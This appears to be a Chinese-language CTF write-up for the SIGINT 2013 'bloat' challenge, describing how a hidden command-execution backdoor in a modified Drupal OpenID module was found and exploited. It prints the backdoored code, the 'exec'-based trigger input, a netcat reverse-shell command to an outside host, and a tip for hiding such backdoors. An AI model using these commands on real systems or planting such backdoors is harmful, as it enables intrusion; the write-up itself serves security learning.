@@ -1,0 +1,379 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>SIGINT 2013 cloud200 bloat - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/ SIGINT 2013 cloud 200 bloat Description My friend set up this site for me. I don't trust &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/sigint2013-cloud200-bloat">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">SIGINT 2013 Cloud200 Bloat</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-09T00:00:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/</a></p>
+
+<h1><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">SIGINT 2013 cloud 200 bloat</a></h1>
+
+<p>Description</p>
+
+<pre><code>My friend set up this site for me. I don't trust him.
+He installed a backdoor for sure. Can you find it?
+He just wrote me, what this system is using.
+Somehow it looks diff-erent o_O:
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/cdd-7.20.tar_0.gz">cdd-7.20.tar_0.gz</a></p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/source_code.tar.bz2">source_code.tar.bz2</a></p>
+
+<p>这道题比赛的时候只有一个队伍做出来。虽然只有200分，但过程比较复杂。</p>
+
+<p>我本来预期花一两个小时就能解决这个问题，结果却耗费了四个小时。</p>
+
+<p>首先也是最关键的问题就是如何找到后门。</p>
+
+<p>这个网站使用的是开源系统drupal 7.20，还附带了一些插件。但问题并不是直接diff那么简单。</p>
+
+<p>官方的源码附有详细的注释，但修改版中将所有注释全部删掉了，还把代码风格从K&amp;R风格改成了一种很混乱的样子，甚至将所有的变量名替换成了奇奇怪怪的东西。</p>
+
+<p>手工查找人眼识别几乎是不可行的。必须想其它办法。</p>
+
+<p>比赛的时候卡在其他题上面了，没有时间仔细看这道题。事后才想起来可以写一个文本处理器，把php文件全部“格式化”一遍：去掉注释+统一格式+统一变量命名。</p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/filter.cpp">PHP_filter.cpp</a></p>
+
+<p>处理注释是最麻烦的一步，要判断引号和各种注释符，最终版本的代码也还有瑕疵。</p>
+
+<p>因为只需要比对出文件的不同之处，所以不需要维护代码风格和变量名。为了统一，我把所有可能换行的<code>{};,:()</code>全都强行换行，又将所有变量名指定成了$000。</p>
+
+<p>用这个非常挫的文本处理器半自动操作，效率已经比人眼识别提升很多，而且出错率降低很多。</p>
+
+<p>但是将所有<code>.php</code>文件对比之后并没有什么收获。</p>
+
+<p>再去查看源码中的文件，发现<code>.php</code>的文件其实并不多。很多插件都是以<code>.inc\.module</code>这样的后缀结尾的。</p>
+
+<p>再扫描一遍<code>.inc</code>后缀的文件，果然发现有一个文件<code>./bloat/modules/openid/openid.inc</code>略有不同。</p>
+
+<pre><code>10 define('OPENID_DH_DEFAULT_GEN', '86');
+</code></pre>
+
+<p>而原版中的openid是</p>
+
+<pre><code>22 /**
+23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
+24  */
+25 define('OPENID_DH_DEFAULT_GEN', '2');
+</code></pre>
+
+<p>这是跟用户认证有关的一个常量。修改这种值也许会造成认证系统的一些缺陷。</p>
+
+<p>继续看代码，我有了更大的收获。</p>
+
+<p>在<code>./bloat/modules/openid/openid.module</code>中代码逻辑与原版有明显的不同。</p>
+
+<pre><code>197 function openid_login_validate($quench, &amp;amp;$tickers)
+198    {
+199 $return_to = $tickers['values']['openid.return_to'];
+...
+204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
+... 
+207      function openid_begin($imaginably, $overlay = '', $termination = array())
+...
+212       if(strpos($imaginably, '@'))
+213   {
+214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
+215 }
+216 else
+217     {
+218      $user = false;
+219      $host = false;
+220      }
+</code></pre>
+
+<p><code>214    list($user, $host) = explode('@', $imaginably, 2);</code>中<code>$imaginably</code>正是用户提交的认证用户名。</p>
+
+<p>再来看看这些变量做了什么。</p>
+
+<pre><code>248 $user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
+249     $service['uri'] = drupal_map_assoc(array($host), $user_enc);
+259   openid_redirect($service['uri'], $ramparts);
+</code></pre>
+
+<p>这里用到了修改过的常量<code>OPENID_DH_DEFAULT_GEN</code>。</p>
+
+<p>drupal&#95;map&#95;assoc()返回的是数组，所以在redirect过程中会被强转成字符串&#8221;Array&#8221;，最后在跳转的时候会出错。</p>
+
+<p>而这个<a href="https://api.drupal.org/api/drupal/includes%21common.inc/function/drupal_map_assoc/7">drupal&#95;map&#95;assoc()</a>则暗藏玄机。</p>
+
+<p>根据官方文档，drupal&#95;map&#95;assoc()会把第一个参数$array中的每个参数依次传入第二个参数$callable执行并返回一个数组。</p>
+
+<p>这里藏着一个命令执行后门啊。。。。</p>
+
+<p>只要<code>is_callable($user_enc)</code>就能直接执行<code>$user_enc($host)</code>。</p>
+
+<p>而<code>$user_enc</code>是从<code>$user * OPENID_DH_DEFAULT_GEN</code>解出来的。</p>
+
+<p>因为<code>OPENID_DH_DEFAULT_GEN</code>的限制，所以这个<code>$user_enc</code>必须是按照base64解成整形之后能整除86（中间还有一些过程）。</p>
+
+<p>现在要做的就是找一个合适的函数，恰好能满足这个条件了。</p>
+
+<pre><code>slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
+Interactive shell
+
+php &amp;gt; include './openid.inc';
+php &amp;gt; var_dump(is_callable('system'));
+bool(true)
+php &amp;gt; var_dump(is_callable('systeM'));
+bool(true)
+php &amp;gt; echo _openid_dh_base64_to_long('system')/OPENID_DH_DEFAULT_GEN ."\n";
+34952922.72093
+php &amp;gt; echo _openid_dh_base64_to_long('System')/OPENID_DH_DEFAULT_GEN ."\n";
+14664196.395349
+php &amp;gt; echo _openid_dh_base64_to_long('SYstem')/OPENID_DH_DEFAULT_GEN ."\n";
+14347185.046512
+php &amp;gt; echo _openid_dh_base64_to_long('eval')/OPENID_DH_DEFAULT_GEN ."\n";
+93703.872093023
+php &amp;gt; echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
+93802
+</code></pre>
+
+<p>因为这里的is&#95;callable是不区分大小写的，本来我还以为后门作者刻意选择了大小写混用的函数名，本来差点要写程序暴搜的。还好偶然发现exec正好符合要求。^&#95;^</p>
+
+<p><strong>如果以后要用这种方法做后门，记得一个有大因子的大小写混用的函数名哦。</strong></p>
+
+<p>接下来就是命令执行了。</p>
+
+<p>可是用<code>93802@echo a &amp;gt; a</code>结果并没有生成文件a。似乎对网站的目录木有写权限。</p>
+
+<p>如果要获取flag，必须要有传递信息的途径。</p>
+
+<p>唯一能想到的方法就只有反连了。</p>
+
+<p>幸运的是服务起的nc有-e选项，正好可以交互，不然还得一次一次地执行命令。</p>
+
+<p>用<code>93802@nc x.x.x.x 8080 -e /bin/sh</code>反弹，本地用<code>nc -l 8080</code>监听。</p>
+
+<pre><code>pwd
+/var/www
+ls -la ./
+total 7904
+drwxr-xr-x  9 root root    4096 Jul  5 01:23 .
+drwxr-xr-x 14 root root    4096 Jul  5 01:53 ..
+-rw-r--r--  1 root root   75028 Mar  7 17:26 CHANGELOG.txt
+-rw-r--r--  1 root root    1481 Mar  7 17:26 COPYRIGHT.txt
+...
+-rw-r--r--  1 root root      34 Jul  5 01:01 ___F_L_A_G___
+...
+cat ___F_L_A_G___
+not here, see /flag on filesystem
+cat /flag
+SIGINT_d4b0844c
+</code></pre>
+
+<p>看来果然是木有写权限～～</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">slipper</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-09T00:00:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/uncategorized/'>Uncategorized</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/sigint2013-cloud200-bloat/" data-via="" data-counturl="http://www.blue-lotus.net/www/sigint2013-cloud200-bloat/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/def-con-ctf-qualifier-2013-omgacm-4-writeup/" title="Previous Post: DEF CON CTF Qualifier 2013 OMGACM 4 Writeup">&laquo; DEF CON CTF Qualifier 2013 OMGACM 4 Writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/sigint-2013-crypto-200-rsa/" title="Next Post: SIGINT 2013 crypto 200 rsa">SIGINT 2013 crypto 200 rsa &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
